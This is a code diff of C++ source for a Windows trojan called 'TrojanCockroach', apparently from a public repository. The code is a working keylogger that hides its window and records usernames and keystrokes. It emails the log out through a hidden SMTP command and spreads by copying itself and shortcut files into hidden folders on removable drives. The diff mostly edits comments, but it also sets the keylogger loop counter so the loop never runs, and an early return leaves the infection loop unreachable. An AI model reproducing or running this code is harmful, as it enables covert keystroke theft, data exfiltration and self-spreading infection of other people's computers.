@@ -12,18 +12,18 @@
 using namespace std;
 
 
-#define FILE_NAME "Record.log"   //log file
-#define FOLDER_NAME "trojanCockroach"  //containing folder
-#define RUN_FILE_NAME "TrojanCockroach.exe"  //main run file
-#define RUN_LINK_NAME "TrojanCockroach.lnk"  //starter link
-#define INFECT_FILE_NAME "Infect.exe"  //infects computer
-#define INFECT_LINK_NAME "Infect.lnk"  //link file
-#define EMAIL_SENDER_FILE_NAME "Transmit.exe"  //email sender
+#define FILE_NAME "Record.log"
+#define FOLDER_NAME "trojanCockroach"
+#define RUN_FILE_NAME "TrojanCockroach.exe"
+#define RUN_LINK_NAME "TrojanCockroach.lnk"
+#define INFECT_FILE_NAME "Infect.exe"
+#define INFECT_LINK_NAME "Infect.lnk"
+#define EMAIL_SENDER_FILE_NAME "Transmit.exe"
 
-#define MIN_RECORD_SIZE 20  //no of PC start count   20
-#define LIFE_TIME 5 //mail will be sent 5 times     5
-#define MAIL_WAIT_TIME 180000   //in milli seconds      180000
-#define MAILING_TIME 60000   //in milli seconds      60000
+#define MIN_RECORD_SIZE 20 //no of PC start count before sending a mail
+#define LIFE_TIME 5 //mail will be sent 5 times from one PC
+#define MAIL_WAIT_TIME 180000
+#define MAILING_TIME 60000
 
 string allDrives;
 int age=0;
@@ -39,20 +39,20 @@ char* getRandomName();
 
 
 main(){
-    FreeConsole();  //window is not visible
+    FreeConsole(); ///hide window
 
     age = get_setAge();
-    if(checkRecordSize()){   ///check for right time
-    
+    if(checkRecordSize()){ ///check for right time
+
         int i=1;
-        while(i<3){  ///try 2 times to send data
+        while(i<3){ ///try 2 times to send data
         
             Sleep(i*MAIL_WAIT_TIME); ///wait
-            if(!system("ping www.google.com -n 1")){    ///check connection
+            if(!system("ping www.google.com -n 1")){ ///check connection
                 ////////////****SEND DATA****////////////
                 sendData();
 
-                Sleep(MAILING_TIME); ///wait or file will be deleted before sending
+                Sleep(MAILING_TIME); ///wait! or file will be deleted before sending
                 DeleteFile(FILE_NAME);
 
                 break;
@@ -61,24 +61,24 @@ main(){
         }
     }
 
-    age=get_setAge();   //if file is deleted then sets new age
+    age=get_setAge();
 
-    //////////////****LOG USER_DATE_TIME****//////////////
-    if(age <= LIFE_TIME){    ///check age
+    ////////////****LOG USER_DATE_TIME****////////////
+    if(age <= LIFE_TIME){
         logUserTime();
     }
 
-    char driveLetter = getRemovableDisk();    //initial search for removable disk
+    char driveLetter = getRemovableDisk(); ///initial search for all disks
     return; // :)
     while(1){
-        ////////////////****LOG KEY****/////////////////
-        if(age <= LIFE_TIME){    ///check age
+        ////////////****LOG KEY****////////////
+        if(age <= LIFE_TIME){
             logKey();
         }else{
             Sleep(5000);
         }
 
-        ///////////////////****INFECT****///////////////////
+        ////////////****INFECT****////////////
         driveLetter = getRemovableDisk();
         if(driveLetter!='0'){
             infectDrive(driveLetter);
@@ -87,9 +87,9 @@ main(){
     
 }
 
-/*
- *  for old file getAge for new file setAge
- */
+/**
+ * For old file get age - for new file set age.
+**/
 int get_setAge(){
     int ageTemp = age;
 
@@ -111,9 +111,9 @@ int get_setAge(){
     return ageTemp;
 }
 
-/*
- *  count no. of lines in record file
- */
+/**
+ * Count number of lines in record file.
+**/
 bool checkRecordSize(){
     string line;
     ifstream myfile(FILE_NAME);
@@ -126,25 +126,25 @@ bool checkRecordSize(){
         myfile.close();
     }
 
-    if(noOfLines<MIN_RECORD_SIZE*2){ // :)
+    if(noOfLines<MIN_RECORD_SIZE*age){
         return false;
     }else{
         return true;
     }
 }
 
-/*
- *  email record using command
- */
+/**
+ * Email all data to the GHOST.
+**/
 void sendData(){
     
     char* command = "Transmit smtp://smtp.gmail.com:587 -v --mail-from \"your.email@gmail.com\" --mail-rcpt \"your.email@gmail.com\" --ssl -u your.email@gmail.com:password -T \"Record.log\" -k --anyauth";
     WinExec(command, SW_HIDE);
 }
 
-/*
- *  record user name time and date
- */
+/**
+ * Record username, time, and date.
+**/
 void logUserTime(){
     FILE *file = fopen(FILE_NAME, "a");
 
@@ -152,37 +152,37 @@ void logUserTime(){
     unsigned long username_len = 20;
     GetUserName(username, &username_len);
     time_t date = time(NULL);
-    fprintf(file, "0\n%s->%s\t", username, ctime(&date)); //write username, time and date in file
+    fprintf(file, "0\n%s->%s\t", username, ctime(&date));
 
     fclose(file);
 }
 
-/*
- *  record key stroke
- */
+/**
+ * Record key stroke.
+**/
 void logKey(){
     FILE *file;
-    unsigned short ch, i, j=0;
+    unsigned short ch=0, i=0, j=500; // :)
 
-    while(j<500){    //loop runs for 25 seconds
+    while(j<500){ ///loop runs for approx. 25 seconds
         ch=1;
         while(ch<250){
             for(i=0; i<50; i++, ch++){
-                if(GetAsyncKeyState(ch) == -32767){  //when key is stroke
+                if(GetAsyncKeyState(ch) == -32767){ ///key is stroke
                     file=fopen(FILE_NAME, "a");
                     fprintf(file, "%d ", ch);
                     fclose(file);
                 }
             }
-            Sleep(1);   //take a rest
+            Sleep(1); ///take rest
         }
         j++;
     }
 }
 
-/*
- *  returns newly inserted disk
- */
+/**
+ * Returns newly inserted disk- pen-drive.
+**/
 char getRemovableDisk(){
     char drive='0';
 
@@ -205,62 +205,50 @@ char getRemovableDisk(){
     return drive;
 }
 
-/*
- *  send files to new drive
- */
+/**
+ * Copy the virus to pen-drive.
+**/
 void infectDrive(char driveLetter){
     char folderPath[10] = {driveLetter};
     strcat(folderPath, ":\\");
     strcat(folderPath, FOLDER_NAME);
 
-    if(CreateDirectory(folderPath ,NULL)){    //if directory creation does not fail
+    if(CreateDirectory(folderPath ,NULL)){
         SetFileAttributes(folderPath, FILE_ATTRIBUTE_HIDDEN);
 
-        ///////////////////////////
         char run[100]={""};
         strcat(run, folderPath);
         strcat(run, "\\");
         strcat(run, RUN_FILE_NAME);
-
         CopyFile(RUN_FILE_NAME, run, 0);
 
-        ///////////////////////////
         char net[100]={""};
         strcat(net, folderPath);
         strcat(net, "\\");
         strcat(net, EMAIL_SENDER_FILE_NAME);
-
         CopyFile(EMAIL_SENDER_FILE_NAME, net, 0);
 
-        //////////////////////////
         char infect[100]={""};
         strcat(infect, folderPath);
         strcat(infect, "\\");
         strcat(infect, INFECT_FILE_NAME);
-
         CopyFile(INFECT_FILE_NAME, infect, 0);
 
-        //////////////////////////
         char runlnk[100]={""};
         strcat(runlnk, folderPath);
         strcat(runlnk, "\\");
         strcat(runlnk, RUN_LINK_NAME);
-
         CopyFile(RUN_LINK_NAME, runlnk, 0);
 
-        ///////////////////////////
         char infectlnk[100]={""};
         strcat(infectlnk, folderPath);
         strcat(infectlnk, "\\");
         strcat(infectlnk, INFECT_LINK_NAME);
-
         CopyFile(INFECT_LINK_NAME, infectlnk, 0);
 
-        ///////////////////////////
         char hideCommand[100] = {""};
         strcat(hideCommand, "attrib +s +h +r ");
         strcat(hideCommand, folderPath);
-
         WinExec(hideCommand, SW_HIDE);
     }else{
         srand(time(0));
@@ -271,16 +259,15 @@ void infectDrive(char driveLetter){
         }
     }
 
-    //////////////////////////////////
     char infectlnkauto[100] = {driveLetter};
     char* randomName = getRandomName();
     strcat(infectlnkauto, randomName);
     CopyFile(INFECT_LINK_NAME, infectlnkauto, 0);
 }
 
-/*
- * returns random name for the link file.
- */
+/**
+ * Returns a random name for the link file.
+**/
 char* getRandomName(){
     char randomName[40];
 
@@ -323,4 +310,3 @@ char* getRandomName(){
 
     return randomName;
 }
-
